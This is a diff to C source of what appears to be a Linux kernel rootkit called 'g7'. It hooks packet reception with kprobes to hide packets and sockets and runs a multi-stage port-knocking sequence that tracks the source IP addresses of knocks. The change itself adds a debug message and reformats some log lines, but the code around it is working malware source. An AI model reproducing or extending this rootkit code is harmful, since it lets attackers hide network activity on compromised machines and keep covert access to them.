@@ -49,6 +49,7 @@ void
 hide_packets(void)
 {
     if (atomic_inc_return(&packet_rcv_install_count) == 1) {
+        DEBUG_INFO("HIDING PACKETS %d, %d\n", rootkit.hiding_packets, rootkit.hiding_sockets);
         p_rcv.pre_handler = g7_packet_rcv;
         p_rcv.post_handler = g7_post;
         p_rcv.fault_handler = g7_fault;
@@ -182,18 +183,18 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
                 if (stage3_knock(src_port)) {
                     DEBUG_NOTICE("[g7] knocked port %d, port knocking sequence completed\n", src_port);
                     add_knock_to_list(&ips_stage3_tail, ip, version);
-                } else {
-                    DEBUG_NOTICE("[g7] failed entering knock stage 3, incorrect port knocked (%d) - resetting knock progress\n", src_port);
-                }
+                } else
+                    DEBUG_NOTICE("[g7] failed entering knock stage 3, incorrect port knocked (%d)"
+                        " - resetting knock progress\n", src_port);
 
                 remove_knock_from_list(&ips_stage2, &ips_stage2_tail, ip, version);
             } else if (list_contains_knock(&ips_stage1, ip, version)) {
                 if (stage2_knock(src_port)) {
                     add_knock_to_list(&ips_stage2_tail, ip, version);
                     DEBUG_NOTICE("[g7] knocked port %d, entering knocking stage 2\n", src_port);
-                } else {
-                    DEBUG_NOTICE("[g7] failed entering knock stage 2, incorrect port knocked (%d) - resetting knock progress\n", src_port);
-                }
+                } else
+                    DEBUG_NOTICE("[g7] failed entering knock stage 2, incorrect port knocked (%d)"
+                        " - resetting knock progress\n", src_port);
 
                 remove_knock_from_list(&ips_stage1, &ips_stage1_tail, ip, version);
             } else {
